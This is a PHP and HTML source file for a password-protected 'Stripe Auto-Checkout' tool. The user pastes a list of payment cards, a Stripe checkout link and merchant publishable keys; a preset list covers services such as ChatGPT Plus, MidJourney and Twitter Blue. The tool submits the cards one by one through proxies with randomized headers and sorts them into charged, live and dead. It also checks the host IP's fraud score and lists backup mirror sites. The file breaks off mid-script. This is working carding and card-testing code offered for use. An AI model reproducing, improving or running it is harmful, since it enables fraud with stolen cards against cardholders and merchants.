<?php

//SET YOUR RANDOM HEADERS
$headers = array(
    'User-Agent: ' => array(
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Edge/16.16299',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).'',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko',
  'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko'
),
    // add more headers here
);

$randomHeaders = array();

// SET YOUR COOKIES
if (!is_dir("cookies")) {
    mkdir("cookies");
}
$gon = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie" . rand(10000, 9999999) . ".txt";
$cookietempfile = fopen($gon, 'w+');
fclose($cookietempfile);

// this is index first visit of user
if ($_SERVER['REQUEST_METHOD'] === 'GET' && !isset($_GET['feedback'])) {
?>
<!DOCTYPE html>
<html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <link rel="apple-touch-icon" sizes="180x180" href="./assets/images/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="./assets/images/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="./assets/images/favicon-16x16.png">
     <meta http-equiv="cache-control" content="no-cache" />
    <title>Ang Key ng Ina mo - ang susi sa buhay mo</title>
    <style>
        body {
            background-color: #f2f2f2;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        
        form {
            background-color: #fff;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.3);
            text-align: center;
        }

        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            cursor: pointer;
        }
		input[type="password"] {
		  border-radius: 5px;
		  border: 1px solid #ccc;
		  padding: 10px;
		  margin-bottom: 20px;
		  width: 100%;
		  max-width: 400px;
		  box-sizing: border-box;
		  font-size: 16px;
		  text-align: center;
		}

		/* Add padding to the right of the input field when password is unmasked */
		input[type="password"].unmasked {
		  padding-right: 45px; /* Adjust this value as needed */
		}

		/* Add icon to the right of the input field */
		.input-group-text {
		  position: absolute;
		  right: 0;
		  top: 0;
		  bottom: 0;
		  display: flex;
		  align-items: center;
		  background: transparent;
		  border: none;
		  padding: 0;
		  cursor: pointer;
		  text-align: center;
		}

		/* Adjust icon size */
		.input-group-text i {
		  font-size: 18px;
		}
    </style>
</head>
<body>
    <form action="index.php" method="POST">
        <b>Password required to open this page:</b>
        <div style="text-align:center;">
		<!-- Include the Bootstrap CSS and fontawesome CSS -->
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-5P/DeekZZEAZp1wtZiIpXNfD5bE1xW5M5y5Q5DndajFiJ2BGkC8W/XgX0qf1tA+bScdJ8RtR0cMvCktnlhAZiQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

		<!-- Include the Bootstrap JS -->
		<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNVQ8" crossorigin="anonymous"></script>
		<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>

		<!-- Form -->
		<form>
		  <div class="input-group">
			  <input type="password" name="pass" class="form-control" placeholder="sabi nino?" id="password" required>
			  <span class="input-group-text" id="toggle-password"><i class="far fa-eye"></i></span>
			</div>
		  </div>

		<!-- Script to toggle password visibility -->
		<script>
			const togglePassword = document.querySelector('#toggle-password');
			const password = document.querySelector('#password');

			togglePassword.addEventListener('click', function (e) {
			  // toggle the type attribute
			  const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
			  password.setAttribute('type', type);

			  // toggle unmasked class to adjust padding
			  password.classList.toggle('unmasked');

			  // toggle eye icon
			  this.querySelector('i').classList.toggle('fa-eye');
			  this.querySelector('i').classList.toggle('fa-eye-slash');
			});
		</script>
		<br>
		<input type="submit" value="Enter">
        </div>
    </form>
<?php
}

// this is the page when successfully entered the correct password & requires url
if (isset($_POST['pass']) && $_POST['pass'] === 'amacanaaclaa'
    && (!isset($_POST['url']) || empty($_POST['url']))) {

$pass = $_POST['pass']; // get the pass from the previous form

echo '<!DOCTYPE html>
<html><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <link rel="apple-touch-icon" sizes="180x180" href="./assets/images/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="./assets/images/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="./assets/images/favicon-16x16.png">
     <meta http-equiv="cache-control" content="no-cache" />
    <title>Ang Key ng Ina mo - ang susi sa buhay mo</title>
    <style>
	body {
	    background-color: #f2f2f2;
	    font-family: Arial, sans-serif;
	}

	.form-container {
	    display: flex;
	    flex-direction: column;
	    align-items: center;
	    justify-content: center;
	    min-height: 100vh;
	}

	.form {
	    background-color: #fff;
	    border-radius: 10px;
	    padding: 30px;
	    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
	    text-align: center;
	    max-width: 400px;
	}

	.form select,
	.form input[type="text"] {
	    border-radius: 5px;
	    border: 1px solid #ccc;
	    padding: 10px;
	    margin-bottom: 20px;
	    width: 100%;
	    box-sizing: border-box;
	    font-size: 16px;
	    text-align: center;
	}

	.form select {
	    max-width: 100%;
	}

	.form label {
	    display: block;
	    text-align: center;
	    margin-bottom: 5px;
	}

	.form input[type="submit"] {
	    background-color: #4CAF50;
	    color: white;
	    border: none;
	    border-radius: 5px;
	    padding: 10px 20px;
	    text-align: center;
	    text-decoration: none;
	    display: inline-block;
	    font-size: 16px;
	    cursor: pointer;
	}
	</style>

	<body>
    <div class="form-container">
        <form class="form" action="index.php" method="POST">
            <h2>Provide the stripe co link below</h2>
            <input type="hidden" name="pass" value="'.$pass.'">
            <label>Checkout Link:</label>
            <input type="text" name="url" placeholder="https://checkout.stripe.com/c/pay/cs_live_a15Y1IYZwo4SGlMCIQm4EVSlDsU4bd1FhjEacYvmFE0ODxth5GaIa4r8lF#fidkdWxOYHwnPyd1blppbHNgWmpiaXFXb30zREJobWxuUUtPZ2JBTFxPTDU1MEA3Z0dTf0QnKSdobGF2Jz9%2BJ2JwbGEnPydLRCcpJ2hwbGEnPydLRCcpJ3ZsYSc%2FJ0tEJ3gpJ2dgcWR2Jz9eWCknaWR8anBxUXx1YCc%2FJ3Zsa2JpYFpscWBoJyknd2BjYHd3YHdKd2xibGsnPydtcXF1dj8qKnJycit2cWprYHdgZGErZmpoJ3gl" required>
            <br>
            <label>PK Live Key:</label>
            <select name="pk_live_key_select" id="pk_live_key_select" required>
            <option disabled selected hidden>Select PK Options</option>
            <option value="">I will provide my own pk_live</option>
            <option value="pk_live_rHudX0Gd50MtPyISpIBdShXq">Mediafire</option>
            <option value="pk_live_ogltRjx6AGmhikTNJbgDIYJI005E2bBVzA">Moviebox</option>
            <option value="pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n">ChatGPT Plus</option>
            <option value="pk_live_51HtphAFvxRVevdXSwMmqH6AzYjQRWtAjYcWph5j2bXoiX9kaBFjYXhCKUJCiyINW37mNarSXvEJe5SeNe6tMLrww00oQ7rdo13">Lezhin</option>
            <option value="pk_live_r5Nvu05SdIl33lqWlJl4i1th00F3uwarsX">Fecurity</option>
            <option value="pk_live_51Klny6JavIy9pYdOCk6XphadL80gWZLgPnyWI4DXPHkyO6ocDGZg6hm9Wt67Ogzc11UodLsBO5PQDEVL1kigVDhS00a8GLusLv">MidJourney</option>
            <option value="pk_live_51HgodtGRvHz7HxXDZGoHvg6LA2ETexYxMH2A4LYbNN8n6lqzGuk3CkdrHWFQ3P3B7Dh448mBs6OJnpIFl7V9sgYD00FLvhh9TB">HydraProxy</option>
            <option value="pk_live_NjCA1yGv5ie85lOhnTt2E11z005pitDerS">BlackBox AI</option>
            <option value="pk_live_51Ika5JA3KZ32dPo1Uxw4aqV0ZMlJ6ATznaCs2P3nJCtDAwj6qw0ACmoab3PrB9eGfrWmxHVtrcWZcSohktLW26Ji00gnr09tHq">Twitter Blue</option>
            <option value="pk_live_51In2OQF6KbQh44q11COsLzIbvnPzOdzg6WIOXQHDFMm9TnI4pjt1tJm9V6tulgkaBozAHONpUdjLHJeJDW1rxneD001MeE6VpM">Suschegg</option>
            <option value="pk_live_51MEOFDA01fqdGEElh0LoXayHzN2Dmoh5B4IpPQ1g3hQLXMNLtSnahZLF5oKcIEi9sIOM9Fx9xNbBI93LKrlToyfX00DwmCXds8">Redfinger</option>
            <option value="pk_live_51McKbyIj7RaCgFGVFRur9zCpNqqXAievH3zLpgf1WpmtcIIYIFlzFiKUHUuxly3zss78QnZtr8AaqHkJvRRchjSG00nQrHQcPW">nat.dev</option>
            <option value="pk_live_5C5OBFQIejDjAbVnFmZGpcRg">instaproxy</option>
            <option value="pk_live_51JbCOgG4xVdWcYVX7t5gYnyeM2EjwUKgKecEMPHBII5ym8CgfLbo1SCTDfqsLlISxfWruslI2Riz7SOIzwu86eRr00WLhP8xHm">juproxy</option>
            <option value="pk_live_51IkuesDMZj1VYsMfrSM4CszwyPI6wi887N1KIXWW3M2OrEeFTKzhfX4lsppbSLx3mkTvKU4eNLfMti15LgXnmamw00KIq31uQv">rdp.sh</option>
            </select>
            <span id="custom_pk_label" style="display: none;">Enter your own pk_live_key</span><br>
            <input type="text" style="display: none;" id="custom_pk_live" placeholder="pk_live_NjCA1yGv5ie85lOhnTt2E11z005pitDerS" name="pk_live_key" autocomplete="off" required>
            <label>Delay:</label>
            <select name="delay" required>
	            <option value="5000" selected disabled hidden>Choose here</option>
	            <option value="250">No delay</option>
	            <option value="3000">3 seconds</option>
	            <option value="5000">5 seconds</option>
	            <option value="7000">7 seconds</option>
	            <option value="10000">10 seconds</option>
	            <option value="15000">15 seconds</option>
	            <option value="30000">30 seconds</option>
	            <option value="60000">1 minute</option>
	            </select>
	            <small><i>(if no delay has been set, the default is 5 seconds)</i></small><br><br>
            <script>
			    const selectElement = document.getElementById("pk_live_key_select");
			    const customPkInput = document.getElementById("custom_pk_live");
			    const customPkLabel = document.getElementById("custom_pk_label");

			    selectElement.addEventListener("change", function() {
			        const selectedOption = selectElement.options[selectElement.selectedIndex].value;
			        if (selectedOption === "") {
			            customPkInput.style.display = "block";
			            customPkInput.setAttribute("required", true);
			            customPkLabel.style.display = "inline-block";
			        } else {
			            customPkInput.style.display = "none";
			            customPkInput.removeAttribute("required");
			            customPkLabel.style.display = "none";
			        }
			    });
			</script>
        <input type="submit" value="Proceed"><br><br>
        Is your Stripe PK not here?<br>
    Then request one by <a href="./?feedback=send" target="_blank">"clicking here"</a>
    </form></div>';
};
// this is the page when successfully entered the correct password & url

if (isset($_POST['pass']) && $_POST['pass'] === 'amacanaaclaa'
    && isset($_POST['url']) && !empty($_POST['url'])) {
?>
<!DOCTYPE html>
<html class="loading">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">    
    <title>Alice Schuberg - autoco</title>
    <link href="https://fonts.googleapis.com/css?family=Muli:300,300i,400,400i,600,600i,700,700i%7CComfortaa:300,400,700" rel="stylesheet">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/vendors.css">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/app-lite.css">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/core/menu/menu-types/vertical-menu.css">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/core/colors/palette-gradient.css">
    	 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
  </head>
<body class="vertical-layout" style="background-color:#112132;" data-color="bg-gradient-x-purple-blue">   
  <style>
		h5,h4{
			color:white;
		}
		.text-center{
			background-color:#0e1d2c;
			border:1px solid #525252;
			border-radius:5px;
		}
		textarea{
			color:white;
			resize: none;
		}

		.text-center::placeholder{
			color:grey;
		}
		.text-center:focus{
			background-color:#0e1d2c;
		}

		textarea::-webkit-scrollbar {
  			width: 5px;
 			background-color: #112132; 
		}

		textarea::-webkit-scrollbar-thumb {
 			border-radius: 10px;
  			background-color: #2e4964; 
		}
		.lista_reprovadass{
			color:#747474;
		}
		.card-body{
			background-color: #1c3044; 
			border-radius:5px;
		}
		.text-center{
			border:none;
		}
		.badge-success,.btn-success{
			background-color: #ffe74c;
			color:black	;
			border:none;
		}
		.btn-success:hover{
			background-color: #c9b63c;
			border:none;
			color:black;
			shadow:hidden;
		}
		.aprovadas{
			background-color: #35a7ff;
			color:black	;
		}
		.badge-danger{
			background-color: #ff5964;
			color:black	;
		}
		.html body .content .content-wrapper{
			background-color:#112132;
		}

		.btn-bg-gradient {
  			background-image: linear-gradient(to right, #FF8008 0%, #FFC837  51%, #FF8008  100%);
   			 margin: 5px;
			 width:49%;
    		padding: 12px 40px;
    		text-align: center;
    		text-transform: uppercase;
    		transition: 0.5s;
    		background-size: 200% auto;
    		color: white;            
    		box-shadow: 0 0 20px #eee;
    		border-radius: 5px;
    		display: block;
			-webkit-box-shadow: 0 0 0 0 #514a9d;
  		}

  		.btn-bg-gradient:hover {
   			background-position: right center; /* change the direction of the change here */
    		color: #fff;
    		text-decoration: none;
  		}

		  .btn-bg-gradient-x {
			background-image: linear-gradient(to right, #ee0979 0%, #ff6a00  51%, #ee0979  100%);
            margin: 5px;
            padding: 12px 45px;
			
            text-align: center;
            text-transform: uppercase;
            transition: 0.5s;
            background-size: 200% auto;
            color: white;            
            box-shadow: 0 0 20px #eee;
            border-radius: 5px;
            display: block;
			-webkit-box-shadow: 0 0 0 0 #514a9d;
  		}

  		.btn-bg-gradient-x:hover {
			background-position: right center; /* change the direction of the change here */
            color: #fff;
            text-decoration: none;
  		}

		  .statusbar{
			height:320px;
			padding-top:50px;
		  }
		  .hr-statusbar{
			border:none;
			height:1px;
			background-color:#3c5c7c;
		  }
		  
		  option { 
    /* Whatever color  you want */
    background-color: #112132;
	color: white;
	}
	</style>
	
    <div class="app-content content" style="display:block;">
      <div class="content-wrapper" style="background-color:#112132;">
<?php

// get fraud score of your ip
$url = 'https://api.ipify.org/';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip = curl_exec($ch);
curl_close($ch);
$url = "https://scamalytics.com/ip/$ip";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$html = curl_exec($ch);
curl_close($ch);

// find the fraud score value in the HTML using a regular expression
preg_match('/Fraud Score: ([0-9]+)/', $html, $matches);
$fraud_score = isset($matches[1]) ? $matches[1] : null;
preg_match('/"risk":"(.*?)"/', $html, $matches);
$risk = isset($matches[1]) ? $matches[1] : null;

if ($fraud_score !== null) {
    $finalscore = "$fraud_score";
} else {
    $finalscore = "";
}
if ($risk !== null) {
    $risk = strtoupper($risk);
} else {
    $risk = "";
}

    
	 echo '<div class="text-center" style="background-color:#112132;">
	 <h4 class="mb-2"><strong>Alice Schuberg\'s Stripe Auto-Checkout</strong></h4>
	 <div class="form-group">
	 CHECKED OUT: <span class="badge badge-success charge">0</span>
	 LIVE: <span class="badge badge-success aprovadas"> 0</span>
	 DEAD: <span class="badge badge-danger reprovadas"> 0</span>
	 TOTAL: <span class="badge badge-primary carregadas"> 0</span>
	 LIMIT: <span class="badge badge-secondary"> 500</span><br>
	 DATE: <span class="badge badge-dark" id="datetime">01/02/2022</span> •  TIME: <span class="badge badge-dark" id="timenow">12:00:00 AM</span> •  IP: <span class="badge badge-dark">'.$ip.'</span> •  <span class="badge badge-dark">FRAUD SCORE OF IP: '.$finalscore.' ('.$risk.')</span>
	 </div>
	 	  </div>';
?>
  <div class="content-body">
  	<div class="mt-2"></div>
	<div class="row">
		<div class="col-md-12">
			<div class="card">
				<div class="card-body text-center">
					<textarea rows="6" class="form-control text-center form-checker mb-2" placeholder="PUT YOUR CARD LIST HERE :>"></textarea>
				
					<div class="input-group mb-1">
<?php

// get the cs key value
$url = isset($_POST['url']) ? $_POST['url'] : '';
$parts = explode('/', $url);
if (count($parts) > 0) {
    $text = $parts[count($parts) - 1];
    $cs_live_value = preg_replace('/#.*$/', '', $text);
} else {
    echo "no detected cs key";
}

// get the pk key value
$pk_live_key = isset($_POST['pk_live_key']) ? $_POST['pk_live_key'] : '';
$pk_live_key_select = isset($_POST['pk_live_key_select']) ? $_POST['pk_live_key_select'] : '';
$pk_key = "";
if (!empty($pk_live_key)) {
  $pk_key = $pk_live_key;
} else if (!empty($pk_live_key_select)) {
  $pk_key = $pk_live_key_select;
}

// patch the values of cs & pk

					echo '<input type="text" style="background-color:#112132;" class="form-control" id="cslive" placeholder="" name="cslive" value="'.$cs_live_value.'">&nbsp;       
										<input type="text" style="background-color:#112132;" class="form-control" id="pklive" placeholder="pk_live_xxxxx" name="pklive" autocomplete="off" value="'.$pk_key.'">';
?>
                    </div>
                    
                    <div class="input-group mb-1">

<?php

// get the amount
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cs_live_value.'?key='.$pk_live_key.'&eid=NA');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$result2 = curl_exec($ch);
curl_close($ch);

$json_response = json_decode($result2);
$totalamt = isset($json_response->payment_intent->amount) ? $json_response->payment_intent->amount : (isset($json_response->invoice->amount_due) ? $json_response->invoice->amount_due : '');
$email = isset($json_response->customer->email) ? $json_response->customer->email : (isset($json_response->customer_email) ? $json_response->customer_email : '');

				echo '<input type="number" style="background-color:#112132;" class="form-control" id="xamount" placeholder="e.g $8.75, type 875" name="xamount" autocomplete="off" value="'.$totalamt.'">&nbsp;
					<input type="text" style="background-color:#112132;" class="form-control" id="xemail" placeholder="placeyouremailhere@email.com" name="xemail" value="'.$email.'">';
// DELETE COOKIES
if (is_file($gon) && is_writable($gon)) {
    unlink($gon);
}

// WELL IF MARAMING TXT FILE SA COOKIES FOLDER, WOOSHOO THEM!!
$cookieFiles = glob(getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie*.txt");
foreach ($cookieFiles as $cookieFile) {
    unlink($cookieFile);
}
?>
										</div>
					<div class="input-group mb-1">
									 <input type="text" style="background-color:#112132; width: 25px;" class="form-control" id="ip" placeholder="ProxyIP:Port" name="ip" autocomplete="off">
					<input type="text" style="background-color:#112132;width: 25px;" class="form-control" id="hydra" placeholder="Username:Password" name="hydra" autocomplete="off">
					</div>


					<button class="btn btn-play btn-glow btn-bg-gradient-x-blue-cyan text-white" style="width: 49%; float: left;"><i class="fa fa-play"></i> START</button>
					<button class="btn btn-stop btn-glow btn-bg-gradient-x-red-pink text-white" style="width: 49%; float: right;" disabled><i class="fa fa-stop"></i> STOP</button>
					
				</div>
			</div>
		</div>

            		<div class="col-xl-12">
			<div class="card">
				<div class="card-body">
					<div class="float-right">
						<button type="show" class="btn btn-primary btn-sm show-charge"><i class="fa fa-eye-slash"></i></button>
					<button class="btn btn-success btn-sm btn-copy1"><i class="fa fa-copy"></i></button>					
					</div>
					<h4 class="card-title mb-1"><i class="fa fa-check-circle text-success"></i> CHECKED OUT <span class="badge badge-success charge">0</span></h4>					
			<div id='cards_charge'></div>
				</div>				
			</div>
		</div>
		<div class="col-xl-12">
			<div class="card">
				<div class="card-body">
					<div class="float-right">
						<button type="show" class="btn btn-primary btn-sm show-lives"><i class="fa fa-eye-slash"></i></button>
					<button class="btn btn-success btn-sm btn-copy"><i class="fa fa-copy"></i></button>					
					</div>
					<h4 class="card-title mb-1"><i class="fa fa-check text-success"></i> INSUFFICIENT FUNDS <span class="badge badge-success aprovadas">0</span></h4>					
			<div id='cards_aprovadas'></div>
				</div>				
			</div>
		</div>
		<div class="col-xl-12">
			<div class="card">
				<div class="card-body">
					<div class="float-right">
						<button type='hidden' class="btn btn-primary btn-sm show-dies"><i class="fa fa-eye"></i></button>
					<button class="btn btn-danger btn-sm btn-trash"><i class="fa fa-trash"></i></button>					
					</div>
					<h4 class="card-title mb-1"><i class="fa fa-times text-danger"></i> FAILED TRANSACTIONS <span class="badge badge-danger reprovadas">0</span></h4>		
						<div style='display: none;' id='cards_reprovadas'></div>
				</div>				
			</div>
		</div>
		
</section>
        </div>
      </div>
    </div>
 
    <script src="theme-assets/js/core/libraries/jquery.min.js" type="text/javascript"></script>

<script>

$(document).ready(function(){


Swal.fire({ title: "Backup Links", html: "<p align=\"center\">Please bookmark the following links for your future reference:<br><a href=\"https://arizuberg.glitch.me/\" target=\"_blank\">Link 1 (arizuberg.glitch.me)</a><br><a href=\"http://aliceschuberg.unaux.com/\" target=\"_blank\">Link 2 (aliceschuberg.unaux.com)</a><br><a href=\"http://aliceschuberg01.vastserve.com/\" target=\"_blank\">Link 3 (aliceschuberg01.vastserve.com)</a>", icon: "warning", confirmButtonText: "Okay, thanks!", buttonsStyling: false, confirmButtonClass: 'btn btn-primary'});


$('.show-charge').click(function(){
var type = $('.show-charge').attr('type');
$('#cards_charge').slideToggle();
if(type == 'show'){
$('.show-charge').html('<i class="fa fa-eye"></i>');
$('.show-charge').attr('type', 'hidden');
}else{
$('.show-charge').html('<i class="fa fa-eye-slash"></i>');
$('.show-charge').attr('type', 'show');
}});

$('.show-lives').click(function(){
var type = $('.show-lives').attr('type');
$('#cards_aprovadas').slideToggle();
if(type == 'show'){
$('.show-lives').html('<i class="fa fa-eye"></i>');
$('.show-lives').attr('type', 'hidden');
}else{
$('.show-lives').html('<i class="fa fa-eye-slash"></i>');
$('.show-lives').attr('type', 'show');
}});

$('.show-dies').click(function(){
var type = $('.show-dies').attr('type');
$('#cards_reprovadas').slideToggle();
if(type == 'show'){
$('.show-dies').html('<i class="fa fa-eye"></i>');
$('.show-dies').attr('type', 'hidden');
}else{
$('.show-dies').html('<i class="fa fa-eye-slash"></i>');
$('.show-dies').attr('type', 'show');
}});

$('.btn-trash').click(function(){
	Swal.fire({title: 'REMOVE CC DEAD SUCCESS', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
$('#cards_reprovadas').text('');
$('.reprovadas').text('0');
});

$('.btn-copy1').click(function(){
	Swal.fire({title: 'COPY CC CHARGED SUCCESS', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
var cards_charge = document.getElementById('cards_charge').innerText;
var textarea = document.createElement("textarea");
textarea.value = cards_charge;
document.body.appendChild(textarea); 
textarea.select(); 
document.execCommand('copy');           document.body.removeChild(textarea); 
});


$('.btn-copy').click(function(){
	Swal.fire({title: 'COPY CC LIVE SUCCESS', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
var cards_lives = document.getElementById('cards_aprovadas').innerText;
var textarea = document.createElement("textarea");
textarea.value = cards_lives;
document.body.appendChild(textarea); 
textarea.select(); 
document.execCommand('copy');           document.body.removeChild(textarea); 
});


$('.btn-play').click(function(){

var cards = $('.form-checker').val().trim();
var array = cards.split('\n');
var pklive = $("#pklive").val().trim();
var cslive = $("#cslive").val().trim();
var xamount = $("#xamount").val().trim();
var xemail = $("#xemail").val().trim();
var ip = $("#ip").val().trim();
var hydra = $("#hydra").val().trim();
var charge = 0, lives = 0, dies = 0, testadas = 0, txt = '';

if(!cards){
	Swal.fire({title: 'Oops! You forgot the cards LOL!', icon: 'error', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
	return false;
}

if(!pklive){
	Swal.fire({title: 'Wheres your pk_live?? please add a pk_live!!', icon: 'error', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
	return false;
}

if(!cslive){
	Swal.fire({title: 'Wheres your cs_live?? please add a cs_live!!', icon: 'error', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
	return false;
}

if(!xamount){
	Swal.fire({title: 'Wheres the amount? please add a amount!', icon: 'error', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
	return false;
}

if(!xemail){
	Swal.fire({title: 'Wheres the email?? please add an email!!', icon: 'error', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
	return false;
}

Swal.fire({title: 'Starting to checkout...', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 11000, html: '<audio autoplay hidden><source src="linkstarto.mp3" type="audio/mpeg"></audio>'});

var line = array.filter(function(value){
if(value.trim() !== ""){
	txt += value.trim() + '\n';
	return value.trim();
}
});

/*
var line = array.filter(function(value){
return(value.trim() !== "");
});
*/

var total = line.length;


/*
line.forEach(function(value){
txt += value + '\n';
});
*/

$('.form-checker').val(txt.trim());
// Limit of CCs will inputted
if(total > 500){
  Swal.fire({title: 'Aaclaa!! Kumalma ka auto-co lang ito hindi checker kaloka kaa goouuurll!\n500 ccs per check only muna okay?', icon: 'warning', showConfirmButton: false, toast: true, position: 'top-end', timer: 5000});
  return false;
}

$('.carregadas').text(total);
$('.btn-play').attr('disabled', true);
$('.btn-stop').attr('disabled', false);

line.forEach(function(data, index){
setTimeout(function(){
var callBack = $.ajax({
<?php
	$colink = isset($_POST['url']) ? urlencode($_POST['url']) : '';
	echo "url: 'checkout.php?cards=' + data + '&cslive=' + cslive + '&pklive=' + pklive + '&xamount=' + xamount + '&xemail=' + xemail + '&ip=' + ip + '&hydra=' + hydra + '&colink=$colink&referrer=Auth',";
?>
	success: function(retorno){
		if(retorno.indexOf("#CHARGED") >= 0){
			Swal.fire({title: 'CHARGED TRANSACTION DONE!\nWow... Congratulations!', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 5000});
			// Add the audio tag and play the sheesh.mp3 file
		    var audio = new Audio('sheesh.mp3');
		    audio.autoplay = true;
		    audio.loop = false;
		    document.body.appendChild(audio);
			$('#cards_charge').append(retorno);
			removelinha();
			charge = charge +1;
			}
			else if(retorno.indexOf("#LIVE") >= 0){
			Swal.fire({title: '+1 LIVE CC', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 5000});
			// Add the audio tag and play the livebin.mp3 file
		    var audio = new Audio('livebin.mp3');
		    audio.autoplay = true;
		    audio.loop = false;
		    document.body.appendChild(audio);
			$('#cards_aprovadas').append(retorno);
